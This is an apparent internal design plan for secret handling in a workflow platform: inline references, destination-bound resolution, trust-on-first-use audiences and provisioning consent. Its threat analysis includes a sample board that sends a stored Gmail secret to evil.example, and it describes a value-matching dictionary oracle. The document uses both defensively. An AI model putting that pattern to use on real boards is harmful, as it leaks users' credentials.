# Secrets: resolved at point of use, bound to a destination

Plan for a fresh session. Decisions were taken 2026-09-04 and supersede the
options listed under **G12b** in TODO-WORKFLOW-PLATFORM.md. Nothing below is
implemented yet.

Backwards compatibility is deliberately broken. It is cheap now — the framework
has one maintainer and the demo boards are ours — and it stops being fixable
once anyone else's boards carry credentials.

---

## The problem this fixes

Two leaks, one root cause: **a resolved secret enters service state.**

`restoreBoard` substitutes `{{secret.<alias>}}` for real values across the whole
board before any service is configured (`hkp-frontend/src/core/boardPersistence.ts:90`),
and from that moment the value is ordinary state. A service is under no
obligation to hide what it was given: `imap-email` and `smtp-email` mask their
password on `getState` (`hkp-node/src/services/imap-email.ts:142`), but
`http-client` reports its headers verbatim.

**Leak 1 — the round trip.** `serializeBoard` scrubs the way out by scanning the
serialized board for any stored secret *value* and writing the reference back in
its place (`redactSecrets`, `core/boardPersistence.ts:227`). Matching on value
makes it a **dictionary oracle**. A hostile board carries N candidate strings in
any free-form state field; N is unbounded because boards travel as links and
cloud shares. The victim opens it, then saves, exports, deploys, or hands it to
"Refine board with AI" — every candidate that matched a vault entry comes back
as `{{secret.<alias>}}`, alias included. One round trip, one bit per candidate,
run against the victim's vault on the victim's machine.

`redactSecrets` has grown two more callers since it was written for
`http-client` alone: `overview/shape.ts:66` and `overview/activity.ts:70`. The
second scans **pipeline data** — any HTTP response body crossing a service edge
is attacker-controlled input to the matcher. Neither output leaves the device
today, so neither closes the loop, but both are the wrong thing to leave sitting
there.

**Leak 2 — the forward path, and the worse one.** References are resolved for
every service and field with no notion of where the board came from. A hostile
board needs no dictionary at all:

```json
{ "serviceId": "http-client", "state": { "url": "https://evil.example/?p={{secret.gmail}}" } }
```

Import, run, done. The oracle is a slow version of a leak already available
directly.

---

## The invariant

> **A resolved secret value must never be reachable from `getState` /
> `getServiceConfig`.**

That path is the only route from a running service back into a board. If a value
cannot be in state, the return path is clean by construction and the scanning
pass has nothing to do.

---

## Decisions

### 1. References stay inline, in state, and are resolved at point of use

A board writes `"password": "{{secret.goodguy.token}}"` exactly where the field
lives. The service **holds the reference** as its state, `getState` echoes it
unchanged, and saving writes back what was configured. Nothing to redact.

Resolution moves out of `restoreBoard` and into the moment of use.

Rejected: a reserved `__hkpSecrets` block declaring secret fields separately.
It was argued for on enforceability — a plain config provably free of
references — but once resolution happens in `withSecrets` the enforcement lives
there and the payload shape carries none of it. Inline is also strictly better
for composites (`"Authorization": "Bearer {{secret.slack}}"`), needs no shadow
mirror of the config shape, and needs no board migration. A service that forgets
to resolve sends the literal `{{secret.…}}` and fails loudly at the far end,
which is safe.

If "which fields of this service may hold a secret" is ever wanted, it belongs
next to the **service class registration**, not in the board. A board must not
be the party asserting what is safe.

### 2. `withSecrets(state, { to })` — you cannot get a value without saying where it goes

```ts
withSecrets(this.state, { to: url })                 // http-client
withSecrets(this.state, { to: `${host}:${port}` })   // imap-email, smtp-email
withSecrets(this.state, { to: apiBase })             // text-generation
```

Returns a transient merged object. It is used and dropped; it is never assigned
back to state and never returned from `getState`.

`to` is **required**. Omitting it yields nothing — fail closed, so the mechanism
cannot quietly rot as services are added. This is what makes the rule generic
rather than an `http-client` special case: every service that uses a secret is
by definition sending it somewhere and knows where.

The trust boundary this assumes: **service code is ours, board content is not.**
The registry ships with the runtime; a board can only choose services and
configure them. We defend against a board pointing a truthful service somewhere
hostile, not against a service that lies.

### 3. Audience — a vault entry says where it may go

```json
{ "alias": "slack", "value": "xoxb-…", "audience": ["hooks.slack.com"] }
```

`withSecrets` checks each requested alias's audience against `to` and refuses on
mismatch. Absent audience means unconstrained, which is also the migration path.

**Learned on first use, not configured.** The first release of `slack` to
`hooks.slack.com` records that host and confirms it in the prompt already being
shown at provisioning. A later use against a different host prompts again.
Trust-on-first-use, like SSH host keys: no configuration in the normal case, a
loud prompt exactly when a board tries something the secret has never done.

This is the only layer that closes the `http-client` case, where the board
controls both the credential and the destination.

Rejected: **egress interception** (wrapping `fetch`/`net.connect` and scanning
outbound bytes for tracked values). It sounds stronger because it trusts no
service code, but it reintroduces value-scanning and block-vs-succeed is
observable — a rate-limited version of the oracle being deleted here.

Also rejected earlier and worth recording: a **per-service schema of allowed
secret paths** (`http-client` may take one in `headers.*`, never in `url`). It
only stops absurd placements; a schema-valid `Authorization: Bearer <gmail>` to
`evil.example` exfiltrates just the same. Hygiene, not a fix, and superseded by
audience.

### 4. Provisioning consent, per (board, runtime, url, alias set)

Before a remote runtime is provisioned, ask: *runtime `node` at
`https://rest.example` may retrieve `imap.password`, `slack`.* With a
"don't ask again" that persists the grant.

- **The URL must be in the key.** A runtime id is board-controlled and
  meaningless alone — the same `node` id is repointed at another host by editing
  one field. Binding the grant to the URL is what makes "don't ask again" safe.
- **The alias set must be in the key.** Store the granted set and compare:
  requested ⊆ granted proceeds silently, anything new prompts for the delta
  only. Otherwise a board edited later to also want `gmail` inherits the old
  grant. The aliases are already computed for the push, so this is free.
- **Skip the prompt for the in-process embedded runtime** (Readymade's hkp-rt) —
  no wire, no server. Prompt for everything else, loopback included: a dev
  `localhost:8080` is still a separate process.

Grants are stored by the host (native vault store; website store is prio B),
never in the board.

### 5. The push: with the create payload, and with the configuration that names one

A value reaches a runtime at two moments, and both are needed. Provisioning is
the obvious one. The other is **configure**: a runtime is created before it has
any services — building a board adds them one at a time and fills their fields
in afterwards — so a board that was never restored from JSON has no provisioning
moment to carry anything. What a configuration names is sent immediately before
it, since configuring a service is what can put it to use.

Only what that configuration names. Anything else a service holds arrived with
the configuration that named it, and the runtime keeps it; re-sending the rest
on every configure would be sending values nothing asked for.

That leaves one thing deliberately unhandled: a vault entry added or changed
*after* a board is running does not reach the runtime by itself. **Accepted as
it stands (2026-09-06)** — reload the board where it already exists, or
reconfigure the service naming the secret while building one, and the value
goes with that. Automatic propagation would belong where the vault changes
rather than in every configure call, which is why it is not smeared across this
path in the meantime.



Provisioning is **one** call. `POST /runtimes` carries the services and their
state, and `tenant.createRuntime(config)` (`hkp-node/src/server.ts:632`)
constructs *and* configures them inside that request. A separate `PUT`
afterwards arrives too late for anything that acts on configure — which is
exactly the credential-taking services (`imap-email.ts:233` connects as soon as
host/user/password are set).

```json
POST /runtimes
{
  "id": "node", "name": "Node", "garbageCollected": true,
  "secrets": { "imap.password": { "value": "…", "audience": ["imap.gmail.com"] } },
  "services": [ { "uuid": "…", "serviceId": "imap-email",
                  "state": { "host": "imap.gmail.com", "password": "{{secret.imap.password}}" } } ]
}
```

The separation that matters is **where the value lands inside the runtime**, not
which request carried it. Same connection, same auth — but `secrets` is unpacked
into a runtime-scoped map with **no read path** (no endpoint, not in `getState`,
not in any serialization), while `state` reaches the service with its references
intact.

- **Only what that runtime's board references.** Computed per runtime by
  `referencedSecrets` over that runtime's service states. Never vault
  replication: a board with one Slack webhook must not put a Gmail password into
  a Node process, and a runtime compromise then leaks only what that board
  needed.
- **In memory, per (tenant, runtime), dies with the runtime.** hkp-node already
  namespaces by JWT `sub`.
- `POST /runtimes/:id/secrets` carries the rest: the configuration that names
  a secret, and a re-push on
  `attachRuntime` — a restarted runtime still has its services but lost the
  map. Idempotent, and it merges, so a partial push never strips the rest.
  POST rather than PUT: it merges rather than replaces, and it is the verb the
  server's CORS allowlist already permits — a lone PUT is one each runtime
  implementation would have to remember to allow.

Rejected: **a persistent vault on the runtime server.** That is where
multi-tenancy gets genuinely hard — per-tenant key management, encryption at
rest, rotation. An in-memory map scoped to the runtime sidesteps all of it and
keeps the browser the only thing holding durable secrets.

---

## What this does not fix

- **Deployed / cloud boards have no secrets until prio B.** A coordinator
  provisions without a browser, so nothing holds a vault to push from. Until
  then this must fail with a clear message, not silently provision with unset
  credentials. See below.
- **A legitimate placement to a hostile destination**, before the audience for
  that alias has been learned. First use is trust-on-first-use, so the first
  prompt is the one that matters; a user who clicks through it is not protected.
- **Nothing here constrains what a service does with a value once it has it.**
  That is the trust boundary in decision 2, taken deliberately.

---

## Prio B — where the other provisioners keep secrets

Values flow **provisioner → runtime**. The browser is the provisioner today, so
it holds the vault; for a cloud board the provisioner is the **coordinator**,
and the browser is never in the path at all. So the deployed case is not a
degraded version of the local one — it is structurally better, because the value
never enters a tab.

That also settles where a vault lives: **with each provisioner.** Three
provisioners, three stores — native app (exists), website, coordinator — with
the **alias as the interface between them**, the same role `__hkpMount` plays
for addresses. A board says `{{secret.imap.password}}`; whichever provisioner
runs it supplies that alias from its own store, or reports it missing.

**No automatic sync between the three.** Background replication multiplies
exposure and makes the audience state ambiguous — which store learned which
destination? An explicit per-alias "copy to cloud" if it is ever wanted.

### B-a. The website store

One bound first, because the alternative is easy to oversell: for a
**browser-runtime** service, plaintext must exist in the tab at point of use.
Any XSS in the app defeats any client-side vault, encrypted or not — the
attacker calls `withSecrets` themselves or waits for it. Client-side encryption
buys protection **at rest** (shared machine, backups, a synced profile, someone
in devtools), not against XSS.

| | Protects at rest | Survives device change | Cost |
|---|---|---|---|
| In-memory, per session | n/a | no | retype constantly |
| IndexedDB plaintext | no | no | — |
| IndexedDB + AES-GCM, passphrase-derived key | yes | no | a passphrase, and a forgot-it story |
| IndexedDB + AES-GCM, WebAuthn PRF key | yes | no (per-authenticator) | needs a fallback path |
| **Server-side `secrets.php`** | yes | **yes** | server can decrypt |

**Chosen: server-side**, next to `api/boards.php` (PostgreSQL, Auth0-verified).
Cross-device is the entire difference between the website and the native app,
and it is the same store the coordinator needs anyway — built once, serves both.
Shape mirrors the runtime map from decision 5: write-only over the API (`PUT` a
value; `GET` returns alias + audience + `configured: true`, never the value),
Auth0 `sub` as the tenant, released to the browser only for the aliases the open
board references, short-lived, and logged.

The release endpoint is an exfiltration API for XSS — but so is the board
itself, so it does not change the ceiling. The mitigation that helps is
architectural: **on the website, prefer credential-taking services in a remote
runtime**, where the value goes server → runtime and the tab never sees it.
Browser-runtime secrets stay possible; they are the weaker position, and the
docs should say so.

The passkey option is a real upgrade later — "the server cannot read your
secrets" — but it is mutually exclusive with cloud boards, per B-b.

### B-b. The coordinator vault

**No new protocol.** The coordinator gets a per-tenant vault and pushes into the
runtimes it provisions using exactly the `secrets` field from decision 5. It
already does everything else a browser provisioner does.

**The tradeoff, stated plainly because it is the kind of thing that gets
promised and quietly broken:** a cloud board runs with nobody watching, so the
coordinator must reach plaintext with no human present. **Unattended execution
requires the server to be able to decrypt.** Encryption at rest with a
server-held key (`HKP_VAULT_KEY`, else persisted like the mount secret) protects
disk theft and backups — not a compromised coordinator. User-held-key encryption
is strictly incompatible with cloud boards; you get one or the other, per board.
Note the board store is unencrypted on disk today
(`coordinator/fileBoardStore.ts`), so the vault is a new kind of content there.

How values get in, three ways:

1. **Deploy carries them.** Rejected: the deploy payload is a plain board POST
   that is safe to log and inspect, and it should stay that way.
2. **The board declares, the user fills in on the coordinator side.** *Chosen.*
   Deploy carries only references. The cloud-board page runs `referencedSecrets`
   over the deployed board and shows "this board needs `imap.password`,
   `slack`"; filled once, written to the coordinator's vault. The act of filling
   the form **is** the consent — explicit, per board, no grant-key machinery —
   and it is the natural analogue of decision 4's prompt for a provisioner with
   no browser.
3. **Coordinator reads the website store.** Couples two backends; only worth it
   if the stores are consolidated later.

**Missing secrets are a board state, not a runtime error.** `resolveSecrets`
already returns `missing`. A deployed board with unfilled aliases reports *needs
configuration: imap.password* and refuses to start, rather than provisioning
with empty credentials and surfacing it hours later as an IMAP auth failure that
names nothing.

### B-c. Shared boards become templates

`api/boards.php` shares boards read-only by email. With references inline and no
values in the board, a shared board is safe by construction: the recipient
resolves `imap.password` against **their** vault, or is told it is missing. That
is a feature, not merely the absence of a leak.

It also means a shared board is **untrusted input**, which is exactly where
audience (decision 3) and consent (decision 4) earn their keep — an argument for
landing those before sharing is opened any wider.

---

## Work

Prio A is all four runtimes. Prio B is the website vault and the coordinator's.

Status as of 2026-09-04: ✅ done, ◐ partly done, ☐ not started.

| # | Work | Where | Size | |
|---|------|-------|------|---|
| 1 | `withSecrets(state, { to })` + audience check; stop resolving in `restoreBoard` | `hkp-frontend/src/core/secrets.ts`, `core/boardPersistence.ts` | S | ✅ |
| 2 | Delete `redactSecrets` and its three call sites | `core/boardPersistence.ts`, `overview/shape.ts`, `overview/activity.ts` | S | ✅ |
| 3 | `secrets` in the create payload + `POST /runtimes/:id/secrets` + push on configure and on attach | `runtime/rest/RuntimeRestApi.ts` | S–M | ✅ |
| 3b | Push when a vault entry is added or changed while a board is running — *accepted as manual for now*: reload, or reconfigure the service | frontend + settings | S | — |
| 4 | Runtime-side secret map (no read path) + resolver | hkp-node ✅ (`src/secrets.ts`, `SecretVault` on `RuntimeHost`), hkp-python ☐, hkp-rt ☐ | M ×3 | ◐ |
| 4b | Nested pipelines reach the surrounding runtime's secrets | `runtime.ts` (`delegateSecrets`), `sub-service.ts`, `nested-pipeline.ts` | S | ✅ |
| 5 | Port credential-taking services | done: `imap-email`, `text-generation`, `OpenAIPrompt`, `WorkflowBoardBuilder`. Left: `smtp-email`, `telegram-listener`, `telegram-sender`, `http-client`, `HttpRelayClient` | M | ◐ |
| 6 | Delete the write-only masking conventions and their "empty means no change" trap | `imap-email` ✅, `text-generation` ✅, `smtp-email` ☐ | S | ◐ |
| 7 | Audience on vault entries + TOFU prompt | `meander/backend/vault.h`, `hkp-frontend/src/vault.ts` — the *check* is implemented on both sides; no store supplies audiences yet | M | ◐ |
| 8 | Provisioning consent + grant store, keyed (board, runtime, url, alias set) | frontend + native store | M | ☐ |
| 9 | Fold `SecretField`'s ad-hoc `uservault.<uuid>.<key>` keys into the same aliases | `SecretField` ✅ (now writes the vault and emits a reference), `HttpRelayClient`'s `authVaultKey` ☐ | S | ◐ |
| B1 | `secrets.php` — per-tenant server-side store, write-only reads, board-scoped short-lived release (B-a) | hkp-website | M |
| B2 | Coordinator vault + encryption at rest; push into coordinator-provisioned runtimes (B-b) | hkp-node coordinator | M |
| B3 | Cloud-board secret form driven by `referencedSecrets`; "needs configuration" board state (B-b) | frontend + coordinator | S–M |

The browser runtime needs no push and no consent prompt — the vault is in the
same process — so it is the cheapest place to prove the `withSecrets` shape.
hkp-node is the reference implementation for the remote half; Python and C++
port from it.

---

### Nesting, and how a nested runtime gets secrets

A nested runtime is provisioned by nobody: no create payload reaches it, so its
own vault is always empty. Rather than push values down at provisioning time —
which would copy them, and would miss anything pushed later — a nested runtime
**delegates**: `HostedRuntime.delegateSecrets` points `secrets()` at a function,
and the service hosting the pipeline points that at its own host. Each level
asks outward until it reaches the runtime that was actually given something, so
nesting composes to any depth and a value pushed while a board is running is
visible inside a pipeline immediately.

There turned out to be **two** nesting implementations, not the one
`nested-pipeline.ts` claims: `SubService` holds a raw `HostedRuntime` (and
`Iterator`, `http-server` inherit that), while `communication-dispatcher` uses
`NestedPipeline`. Both now delegate. Worth consolidating; until then, a third
implementation would need the same two lines.

---

## Open questions

- **Where `to` comes from for a service whose destination is itself a
  reference.** `http-client` with a templated URL resolves its own state to
  build `to`; the audience check then runs against a value the board supplied.
  That is fine — the check is on the destination, not on its provenance — but it
  wants a test.
- **`sub-service` / `nested-pipeline`.** A nested service's state travels inside
  its host's state. `referencedSecrets` walks it correctly for the push, but the
  consent prompt should name the *inner* service, not the wrapper.
- **Whether `to` should be a host or a full URL.** Host is what audience matching
  wants; a full URL is what a service naturally has. Normalize in `withSecrets`.
- **Vault entries are not encrypted at rest** (`~/.hkp/vault.json`, `0600`).
  Unchanged by this work, still worth fixing.
- **Whether a board can opt out of ever being deployed**, which is what would
  make passkey-derived encryption (B-a) usable for it — the server cannot
  decrypt, so the board can only run where a human unlocks it.
- **Whether the website store and the coordinator vault stay separate.** They
  are the same shape and the same tenant; consolidating would make B-b option 3
  attractive and remove one store. Kept separate for now because they fail
  independently and the coordinator may not be ours.
- **What the browser release endpoint (B-a) scopes to.** Aliases referenced by
  the open board is the obvious answer, but a board can be edited in the tab, so
  "the open board" is a moving target.
